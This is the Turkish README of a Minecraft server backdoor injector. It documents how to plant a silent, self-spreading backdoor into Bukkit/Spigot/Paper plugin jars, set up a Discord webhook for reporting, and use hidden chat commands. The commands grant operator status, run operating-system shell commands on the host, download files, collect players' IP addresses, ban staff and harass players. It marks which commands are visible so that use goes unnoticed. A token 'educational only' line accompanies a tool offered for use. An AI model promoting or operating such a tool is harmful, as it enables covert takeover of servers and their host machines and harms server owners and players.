

# Thicc Industries Backdoor

Minecraft Bukkit/Spikgot/Paper sunucuları için sessiz, yayılan bir backdoor.
Enjektörü kullanmak önerilir, manuel kullanımda oluşabilecek sorunları kendin halletmelisin.

Tamamen eğitim amaçlı. Sahibi veya kullanma izinin olmayan sunucularda kullanma.

## Gereksinimler:
* Java 8 runtime.
* İstenen hedef plugin jar dosyası.

## GUI Kullanım:
* backdoor-(version).jar Çalıştır.
* İstenen plugin dosyasını seç.
* Minecraft UUID'ni gir.
* Önek belirle. (Varsayılan: #)
## Bilinen Sorunlar
Eğer [Sorun 82](https://github.com/ThiccIndustries/Minecraft-Backdoor/issues/82)'ya benzer bir sorun yaşıyor iseniz, backdoor'u kendi klasörüne koyup ordan çalıştırmayı deneyin. Başlat Menüsünden çalıştırmayın.
## CLI Kullanımı:
Java -jar backdoor.jar (filename) [options]
* --help / -h : Yardım mesajını göster
* --offline / -o : UUID yerine kullanıcı adı kullan
* --users / -u : Yetkili kullanıcıların UUID'leri veya kullanıcı adları. Eğer boş ise, herkes komutları kullanabilir.
* --prefix / -p (Default: '#') : Backdoor komutları için önek.
* --discord /-d : Discord webhook linki. Readme'ye göz at.
* --spread / -s : Diğer pluginlere yayıl.
* --debug / -b : Konsola hata ayıklama mesajları gönder. Hata kaydı açmadan önce bunu kullan.

## Discord Token Ayarlama
1) Bir Discord sunucusunda, Sunucu Ayarlarını aç, ve sonra "Entegrasyonlar"
2) Webhook Oluştur'a Tıkla
3) İsim ve Profil resmi özelleştrilebilir, Sonra "Webhook URL'sini Kopyala" tıkla.
4) Enjektöre/Komut satırına yapıştır.

## Commands
Varsayılan komut öneki ``#``,  bu sonradan değiştirilebilir.
* #help - tüm komutları göster, veya komut açıklamasını göster
* #op - belirtilen oyuncuyu operatör yap
* #deop - belirtilen oyuncuyu operatörlükten çıkar
* #ban - Sebep ve kaynak ile bir oyuncuyu banla
* #banip - Sebep ve kaynak ile bir oyuncuyu ip banla
* #gm - belirtilen oyun moduna geç
* #give - istenen miktarda belirtilen bir eşya al
* #exec - Komutu sistem konsolu olarak çalıştır **[Görünür]**
* #shell - belirtilen komutu işletim sistemi komutu olarak sunucuda çalıştırır **[Görünür]**
* #info - sunucu hakkında bilgi göster
* #chaos - Yetkilileri banla ve Yetkilerini al, Herkesi yetkilendir, bunu komutu bir operator değilken çalıştır **[Görünür]**
* #seed - geçerli dünya tohumunu al
* #psay - belirtilen oyuncu olarak mesaj gönder
* #ssay - sunucu olarak mesaj gönder
* #rename - kullanıcı adını değiş
* #reload - Sunucuyu yenile **[Görünür]**
* #getip - oyuncunun ip'sini al
* #listworlds - tüm dünyaları görüntüle
* #makeworld - yeni bir dünya oluştur **[Görünür]**
* #delworld - bir dünya sil **[Görünür]**
* #vanish - yok ol, tab dahil.
* #silktouch - oyuncunun ellerine ipeksi dokunuş verir.
* #instabreak - oyuncu blokları anında kazar
* #crash - oyuncu ismini çökertir
* #troll - oyunucuları farklı şekillerde trolle
* #lock - konsolu kitler veya oyuncuyu bloklar
* #unlock - konsolun kilidini açar veya oyuncunun bloğunu kaldırır
* #mute - oyuncuyu susturur
* #unmute - oyuncunun susturmasını kaldırır
* #download - bir dosya indirir
* #coords - belirtilen oyuncunun kordinatlarını alır
* #tp - belirtilen kordinatlara ışınlan **[Görünür]**
* #stop - sunucuyu kapat **[Görünür, Aşağıya bak.]**

**[Görünür]** Olarak işaretlenmiş komutlar oyun içi chat'ten veya sunucu konsolundan farkedilebilir.

Uyarı:
Işınlanmak '[player name] moved to quickly!' uyarısının sunucu konsolunda çıkmasına sebep olabilir. Ayrıca anti virus tarafından atılmanıza da sebep olabilir.
Daha acayip olaylar aşırı ekstrem uzaklara ışınlanırken gerçekleşebilir. (örneğin dünya sınırı)

## Troll altkomutları
* clear - Oyuncunun tüm statülerini temizle. Bu Instabreak, Vanish, ve silktouch'ı da etkileyecek.
* thrower - Oyuncuyu yığınlarca taş ile spamla.
* interact - Dünya etkileşimini kes
* cripple - Oyuncu olduğu yerde donacak
* flight -  Oyuncu uçamaz, yaratıcı modda bile.
* inventory - Envanter etkileşimini devre dışı bırak
* mine - Oyuncu blok kazamaz
* login - Oyuncu oyuna katılamaz, Rasgele hata mesajları oluşturur
* god - Ölümsüzlük
* damage - Oyuncu hasar veremez

## Lisans
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
Thanks to @DarkReaper231 for additional features.
